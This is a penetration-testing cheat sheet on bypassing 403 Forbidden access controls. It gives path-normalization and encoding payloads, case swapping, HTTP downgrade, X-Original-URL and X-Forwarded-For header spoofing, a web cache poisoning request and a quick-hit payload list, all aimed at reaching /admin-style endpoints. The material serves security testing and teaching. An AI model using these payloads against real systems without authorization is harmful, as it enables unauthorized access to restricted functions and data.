A 403 Forbidden error indicates that the server understands the request but refuses to authorize it. This is often due to a misconfigured access control list (ACL) or a web application firewall (WAF) rule. The goal is to abuse inconsistencies in how the server, reverse proxies, or caches parse the URL and headers to access restricted endpoints.

## Initial Methodology

Before attempting specific bypasses, perform these initial recon steps to gather more information about the target.

*   **Wayback Machine:** Search for the subdomain on the Wayback Machine to discover previously accessible paths that may now be restricted.
*   **Fuzzing & Content Discovery:** Use tools like `ffuf` or GoSpider to fuzz for hidden or unlinked directories and files that might have different access controls.
*   **Google Dorks:** Use Google dorking to find exposed pages or directories related to the target that shouldn't be public.
*   **Automated Tools:** Run specialized 403 bypass tools to quickly check for low-hanging fruit.

## Bypass Techniques

### URL Manipulation

These techniques abuse URL parsing inconsistencies between different components of the web server stack.

#### Path Traversal & Normalization

Try adding various path traversal and normalization characters to the URL.

*   **Append `.` or `/`:**
    ```bash
    # Original: 403 Forbidden
    https://target.com/admin
    
    # Bypasses
    https://target.com/admin/
    https://target.com/admin/.
    https://target.com/admin/./
    https://target.com/admin/*
    ```

*   **Double Slashes:**
    ```bash
    # Original: 403 Forbidden
    https://target.com/admin
    
    # Bypass
    https://target.com//admin//
    ```

*   **URL Encoded Characters:** Use URL-encoded equivalents, like `%2e` for `.`, or `%2f` for `/`.
    ```bash
    # Original: 403 Forbidden
    https://target.com/admin
    
    # Bypass
    https://target.com/%2e/admin
    https://target.com/%2f/admin/
    ```

*   **Semicolon & Traversal Payloads:**
    ```bash
    # Original: 403 Forbidden
    https://target.com/admin
    
    # Bypasses
    https://target.com/admin..;/
    https://target.com/;/admin
    https://target.com/.;/admin
    https://target.com/./secret/..
    ```

#### Case Swapping

Some servers or rule-based filters may only match lowercase or specific-case patterns.

```bash
# Original: 403 Forbidden
https://target.com/admin

# Bypass
https://target.com/Admin
https://target.com/aDmIN
```

#### Protocol Mismatch

Occasionally, access controls are only applied to the HTTPS version of a site.

```bash
# Original: 403 Forbidden
https://target.com/secret

# Bypass
http://target.com/secret
```

### HTTP Header Bypasses

Headers can be used to manipulate how the server perceives the request's origin or intended destination.

*   **`X-Original-URL` / `X-Rewrite-URL`:** These headers are often used by reverse proxies to inform the backend server of the original request URL. If the ACL is on the proxy, you can bypass it by hitting a non-protected endpoint while pointing to the protected one in the header.

    ```http
    GET /public HTTP/1.1
    Host: target.com
    X-Original-URL: /admin
    ```
    *Also try `X-Rewrite-URL`.*

*   **`X-Forwarded-For`:** Spoof your IP to appear as an internal user or the server itself.

    ```http
    GET /admin HTTP/1.1
    Host: target.com
    X-Forwarded-For: 127.0.0.1
    ```
    *Other headers to try: `X-Forwarded-Host: 127.0.0.1`, `X-Custom-IP-Authorization: 127.0.0.1`.*

### Web Cache Poisoning

This is a more advanced technique. If the server caches responses based on certain headers, you can send a request with a bypass header (like `X-Original-URL`) to a publicly accessible endpoint. The server might cache the response from the restricted endpoint but serve it under the public URL to other users.

```http
GET /public/style.css HTTP/1.1
Host: target.com
X-Original-URL: /admin/dashboard
```

## Payloads

A curated list of quick-hit payloads to test manually or with an automator.

```bash
/admin
/admin/
/admin/.
/admin/*
/admin/..;/
/aDmIn
//admin//
/./admin/..
/%2e/admin
/;/admin
```

## Tools

*   [bypass-403](https://github.com/daffainfo/bypass-403)
*   [403bypasser](https://github.com/yunemse48/403bypasser)
*   [4-ZERO-3](https://github.com/Dheerajmadhukar/4-ZERO-3)

## References

*   [@iam_j0ker](https://twitter.com/iam_j0ker)
*   [@remonsec](https://twitter.com/remonsec)
*   [@KathanP19](https://twitter.com/KathanP19)
*   [Hacktricks - Pentesting Web](https://book.hacktricks.xyz/pentesting/pentesting-web)
*   [Bypassing 403 to get access to an admin console endpoints](https://observationsinsecurity.com/2020/08/09/bypassing-403-to-get-access-to-an-admin-console-endpoints/)
*   [Mehedi Hasan Remon's YouTube Channel](https://www.youtube.com/channel/UCF_yxU7acxUojiGiOAMafQQ/videos?view_as=subscriber)